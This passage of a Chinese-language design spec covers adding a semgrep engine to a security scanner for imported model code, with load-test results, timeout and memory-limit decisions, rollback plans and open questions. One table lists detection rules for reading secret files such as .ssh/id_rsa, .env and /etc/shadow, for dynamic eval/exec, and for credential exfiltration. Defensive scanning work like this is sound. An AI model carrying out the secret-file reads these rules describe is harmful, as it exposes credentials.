| 4 并发 | 10 | 8 | 10/10 ok，HTTP 200 | 5.4 s / 0.5 s / 9.2 s |
| 8 并发 | 10 | 9 | 10/10 ok，HTTP 200 | 9.9 s / 7.0 s / 12.8 s |
| 12 并发 | 10 | 10 | 10/10 ok，HTTP 200 | 11.0 s / 1.1 s / 16.3 s |
| **合计** | 40 | **27** | **40/40 ok，零超时、零 5xx** | 受载 8.7 s / 空闲档 0.3 s |

> 脚本自身按「探针开始时是否真有扫描在跑」聚合的同一份数据：`loaded: n=27 mean=8.7s max=16.3s`、`idle: n=13 mean=2.3s max=11.8s`。**`idle` 档不是空闲基线**：它混入了跨轮边界的样本（探针开始时上一轮刚排空、下一轮在探针进行中起来），真正的空闲基线是 0 并发那一行。

**同轮的对照列**：

- **`llama_pid` 全程 = `106`，40 个样本无一例外**：llama-server **没有被杀过**，也没有重启。这一列是本测试真正的判据——证据报告 §4.2 记录的失败形态是「容器存活、`RestartCount=0`，而推理已停摆」（`.claude/specs/2026-09-22-…-evidence-design.md:435`），故**容器存活不作为证据**，进程身份才作数。
- **`llama_rss_kb` 全程 2 253 252 – 2 253 312 kB（漂移 60 kB）**：模型没有被换出、没有被卸载。
- **扫描侧 168 次全部 `exit 0`、stderr 全空、`results=80 errors=0 scanned=400` 逐次完全一致**（4 并发 20 次 + 8 并发 64 次 + 12 并发 84 次）。并发没有改变扫描结论，也没有触发 §6.5.1 的 `--max-memory` 降级形态——那是 **exit 0 + `errors` 非空**的**静默**形态，而这里 `errors` 恒为 0。
- **内存包线**：`MemAvailable` 最低 **3.22 GB**（连续 1 s 采样；探针采样点为 3.37 GB），semgrep 合并峰值 **4.35 GB**（12 并发档），ollama 峰值 2.29 GB。**未触发 OOM**。

> **一处口径须写明**：`scans_active` 是**探针开始时**的瞬时值，而一次探针本身要跑数秒，跨轮边界的样本会出现「开始时扫描数很少、耗时仍是数秒」（12 并发档的第 6、9、10 个样本即如此）。故「受载样本数」是**下界**；判据用整轮均值与最大值，不做逐样本二分。

**结论（两条，都必须写清）**：

1. **本次负载下未复现「推理被饿死」**：40 个探针全部 `state=ok`／HTTP 200，无超时、无 5xx；`llama-server` 身份与 RSS 全程不变。**这不推翻证据报告 §4.2 的实测**——那次的负载（P0 期间的完整链路）比这里重，且本语料仅 1.18 MB，`--max-memory 1024` 从未被触到。**一次未复现 ≠ 不存在**；D4 是拓扑决策，不依赖复现。
2. **但它量到了代价，且与既有实测同量级**：延迟由空闲 0.3 s 抬到 4 并发 5.4 s、8 并发 9.9 s、12 并发 **11.0 s**（受载样本合并均值 8.7 s，即**约 30 倍**）。证据报告里那轮「推理停摆」的**成功调用中位数是 12.2 s**（§5 的两通道表）——**本测试的合成负载落在同一量级**，而那次的两记 60 s 上限撞击发生在更重的真实链路上。这正是「正式部署必须把 LLM 移出该内存域」的正面证据：**即便不死，同域并发的延迟代价也已进入同一个 30 s 超时预算**（12 并发下最坏单次 16.3 s，已占预算的 54%）。

**本测试判据与 §5.1 的一致性**：§5.1 第 4 条（＝§9.3 第 1 条）要求留出集验证覆盖「扫描 + LLM 同时受载」。G-3 用的是合成负载与探针，**不是留出集**，故它**不能**替代那一条——阶段 H 仍需按 §9 建集并在 `assist` 下判定。（§9.2 **要求 10** 是另一件事，已由 G-1 关闭：镜像内对同一版本复跑集成测试、版本号记入部署产物。）

#### G-4 对 Q5 的收敛

§12.2 Q5 要求「阶段 G 按实测调整 [semgrep 超时]，并须同时定内存上限」。实测后**两个默认值都不动**，理由如下：

| 项 | 值 | 依据 |
|---|---|---|
| `security.semgrepTimeoutSeconds` 默认 | 300 s（`codeaudit.DefaultSemgrepTimeout = 5 * time.Minute`） | 本阶段最大的一次真实扫描是 400 文件 / 1.18 MB，单次约 5 s；12 并发下 84 次扫描全部完成，最坏一轮也在数十秒量级（G-3 的 7 轮 12 并发全部收尾）。300 s 有**一个数量级余量**，且超时即 fail-closed（§8），故「过紧」的代价（误阻断真实导入并**删除模型代码**）远大于「过松」的代价（一次导入多等）。**调小才是危险方向** |
| `--max-memory` | 1024 MB（`codeaudit.DefaultSemgrepMaxMemoryMB`） | 单次扫描实测峰值 ≈ 165 MB；12 并发合并峰值 4.35 GB（含 12 个进程的 Python 解释器开销）。上限的作用不是「够用」，而是把「失控的那一次」限制在约 1/10 内存域内；设太高等于不设 |

> **`--max-memory` 是 fail-closed 控制而非调优旋钮**（代码注释已写明）：实测 `--max-memory 20` 时 semgrep 仍 **exit 0**，findings 由 80 降到 69、`errors` 增到 134、`paths.scanned` 仍是 400。即内存超限**不报错**，只是**少报**——这正是 §6.4「`errors` 非空或 `scanned` 未覆盖全部 target 即返回 error」必须存在的原因。

---

## 11. 回滚与 kill switch

1. **引擎选择是配置项** → 回滚 = 改配置回 `regex`，无需回滚二进制。"regex 引擎在接入后必须保持完整可用" 是硬要求，**不得**在接入时删除。
2. **报告 schema 兼容**：新增字段全部 `omitempty` 或零值安全，使切换引擎不改变下游解析（`projectCodeAuditSection`、`auditReportJSON`、训练报告）。
3. **kill switch 的独立性**：semgrep 路径出现未知失败时，必须能**只**回退引擎而保留其余（fail-closed、policy fail-fast）改进。
4. **灰度**：阶段 H 通过后，先在单实例切换并留观察窗口，再改默认值。

---

## 12. 未决问题

按「是否需要你拍板」分两类。**Q1 已因顺序调整而降级**：容器部署在代码接入之后、且只作功能测试，正式发布镜像才需要答案。

### 12.1 需要你决定

**Q2 —— 两条规则的严重度按哪边算？**

| 规则 | 是什么 | 生产 Go（今天） | 目标态文档 |
|---|---|---|---|
| `DYN_001` | 动态反射：`eval()` / `exec()` / `importlib.import_module` | **MEDIUM** | HIGH |
| `FIL_001` | 读敏感文件：`.ssh/id_rsa`、`.env`、`/etc/shadow` | **MEDIUM** | HIGH |

（第三条 `EXF_001`（凭据外发）目标态写 CRITICAL，但生产只有 HIGH/MEDIUM 两级，**没有 CRITICAL 这个等级**，引入它是另一件事。）

**为什么要问**：生产默认策略 `assist` **只拦分类后的 HIGH**。这两条升成 HIGH 后，在**静态严重度真正起作用的那条路径上**（LLM 关闭或整体不可用，见 §3.2.1）它们会**开始单独拦截**。

> ⚠️ **本问题的后果经 2026-09-23 实测后大幅收窄，初稿的量化是错的。** 初稿写「`assist` 下现在只拦 6 个良性样本（FPR 0.12），升 HIGH 会明显抬高」。实测：`assist` 下被拦良性样本 **26（regex）/ 28（semgrep）**，FPR **0.52 / 0.56**。而**升 HIGH 在 `audit-100` 上零影响**——因为静态严重度只在无裁决/`UNCERTAIN` 时生效，而该语料 16 个 `UNCERTAIN` 发现**全部已是静态 HIGH**。**「会明显抬高」这个理由不成立。**

**建议**：**先按现状 MEDIUM**。真正的理由只有一条，但足够：**静态严重度是本次接入中被测量的输入之一（`ClassifyFindingRisk` 的 fallback 分支），改它即改受测处理，使已取得的证据失效**。要不要升是独立的产品决策，其真实影响面是「LLM 不可用时的行为」，与本次接入无关，建议单独提、单独建证据。

**Q3 —— ~~接受「semgrep 与 LLM 挤在同一个容器」的风险吗？~~ 已由 D4 关闭，不再是未决问题。**

**用户于 2026-09-23 决定：正式部署时 `taa + semgrep` 绑定同容器、LLM 单独部署。** 争用从**拓扑上**消除（成因是同一个 9.703 GiB 内存域，分开即不成立），不是测量后接受。原「靠阶段 G 压测裁决」的安排随之取消——阶段 G 仍执行压测，但其结论改为**为「必须分离部署」提供直接证据**，不再用于回答本问题。完整论证见 §5.0。

**未随 D4 关闭的部分（仍须处理）**：`parse_error` 通道（14/468，模型 JSON 未转义）与拓扑**无关**，D4 消除不了，接入后仍常态发生 → §8 的 fail-closed 契约一字不减。见 §1.1 的两通道表。

### 12.2 我按下列默认值推进，你不反对即照此实施

| # | 问题 | 默认处置 |
|---|---|---|
| **Q1** | 装 semgrep 是否改变平台校验的本机 TEE 度量？ | **降级**：只在正式发布镜像时需答案，容器功能测试不受阻塞。届时须先核实，**核实前不得声称「接入不影响度量」** |
| **Q4** | 结构化污点链路怎么送达 LLM？ | **用现成文本字段 `CPGEvidence`**（`rules.go:40`，已被 `verifier.go:48-51` 用于覆盖 `ContextAfter`）。今天就能用、不动协议。原样送结构化数据需扩 TEE-LLM 协议（跨仓库），留待以后 |
| **Q5** | 生产 semgrep 超时取值？ | **默认 300 秒，可配置，超时即 fail-closed**。评测侧的 120 秒是对小型合成样本测的；真实模型目录更大。**阶段 G 已实测，决定不改默认值**（§10.1 G-4）：400 文件 / 1.18 MB 单次约 5 s，12 并发下最坏也在数十秒量级，300 s 有约一个数量级余量；内存上限取 `--max-memory 1024`（单次实测峰值约 165 MB）。两者都是 fail-closed 控制，**调小才是危险方向** |
| **Q6** | `CheckImportWithLLM`（`verifier.go:182`）与 `CheckImport`（`scanner.go:206`）是改还是弃用？ | **一起改**，让两者走同一个引擎选择。留着它们继续走 regex 是陷阱：名字看起来在工作，实际没走新引擎 |

---

## 13. 明确不做的事

1. **不实现多语言。** `go/rules.yaml`（6 条）、`shell/rules.yaml`（3 条）存在，但生产 `Extensions` 只有 `.py`；扩语言是独立变更，须各自建留出集。
2. **不实现目标态 4 阶流水线的完整形态。** Stage 2 的 AST 符号归一化、Stage 3 的双模并发、§4 的语言矩阵都**超出本次范围**。本次接入只用到 semgrep 的 Search 能力，与评测证据的形态一致。
3. **不改 Tier 2。** Prompt、模型、策略语义、`teellm` 协议（Q4 除外）均不动。
4. **不改评测侧口径。** 包括 §7.2 的未知严重度默认值——改了会使已完成的 6 轮不可比，登记为后续项。
5. **不在本次引入 `CRITICAL` 等级。** 见 §7.3。

---

## 14. 与既有 spec 的关系

| Spec | 关系 |
|---|---|
| `2026-09-22-semgrep-engine-noninferiority-evidence-design.md` | **前置，但准入条件尚未满足**。其判定是本规范的准入条件；其 §7.2（拟合集）、§7.1（整包替换）、§5.3（0 容差）三条限制被本规范继承。**2026-09-23 实测追加第四条限制：该 PASS 只在 `gate` 下成立，生产默认的 `assist` 下结论相反**（该 spec §5.3 勘误、§9.8 勘误三、§12 第 4b 项已登记） |
| `2026-09-17-semgrep-audit-engine-design.md` | **目标态**。本规范是实现它的第一步，但**只实现其中的 Fail-Closed 契约（§8）与规则严重度语义**；其 §5 严重度列与生产冲突处已按 §7.3 裁决为延后 |
| `2026-09-17-inference-engine-decoupling-security-protocol-design.md` | **张力**。D1 的 `exec` 边界与该规范所修的失效模式同构（§5）。本规范以 §5.1 的四条实施要求缓解，并把残余风险交阶段 G 的容器压测裁决（§12.1 Q3） |
| `2026-09-22-semgrep-engine-evidence-plan.md` | 已完成的证据实施计划，与本规范无重叠 |

---

## 15. 里程碑总结

- ✅ 证据：`audit-100` 上**在 `gate` 策略下**非劣性通过（**拟合集**，不覆盖留出集）
- ⚠️ **证据的适用性已收窄（2026-09-23 实测）**：同一批数据在生产默认的 `assist` 下三对 `ΔFPR = +0.04` 同向 → **本次接入尚不具备生产默认策略下的准入证据**，阶段 H 因此是**阻断性**的，不是走过场（§3.2.2、§9.4）
- ✅ **D4 已定**（2026-09-23）：`taa + semgrep` 绑定部署、LLM 单独部署；§5 的冲突由拓扑消除，Q3 随之关闭
- ⬜ 本规范评审：仅 **Q2**（两条规则的严重度）需你拍板——且其后果经实测后**大幅收窄**（在 `audit-100` 上零影响，§12.1 Q2）；Q1/Q4/Q5/Q6 已按 §12.2 默认值推进
- ✅ **阶段 A–F：本地 Go 代码接入**（已落地并提交）
- ✅ **阶段 G：容器部署与功能验证（2026-09-23）**——部署、容器内 smoke、同容器并发压测均已完成，详见 §10.1。**smoke 不产生证据**；压测为 D4 取得了直接证据（延迟被并发抬高约一个数量级，而 `llama-server` 进程身份与 RSS 全程未变）
- ⬜ **阶段 H：留出集非劣验证（阻断性）**——须按 §9 建集，**在 `assist` 下判定**，并比对两臂 Prompt 等价性
- ⬜ 切换默认引擎 + 灰度
- ⬜ 正式发布镜像前核实 Q1
